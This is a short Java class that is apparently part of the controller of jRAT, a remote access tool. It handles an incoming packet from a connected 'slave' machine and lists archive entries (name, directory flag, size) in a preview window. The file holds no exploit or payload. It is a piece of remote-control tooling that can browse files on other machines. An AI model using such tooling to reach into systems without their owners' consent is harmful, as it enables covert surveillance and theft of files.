package jrat.controller.packets.incoming;

import iconlib.FileIconUtils;
import jrat.common.utils.DataUnits;
import jrat.controller.Slave;
import jrat.controller.ui.frames.FramePreviewZip;

import javax.swing.*;

public class Packet45ArchivePreview extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		boolean dir = slave.readBoolean();
		String name = slave.readLine();
		String filesize = DataUnits.getAsString(slave.readLong());

		FramePreviewZip frame = FramePreviewZip.INSTANCES.get(slave);

		if (frame != null) {
			Icon icon = FileIconUtils.getIconFromExtension(name, dir);

			frame.getModel().addRow(new Object[] { icon, name, dir ? "" : filesize });
		}
	}

}
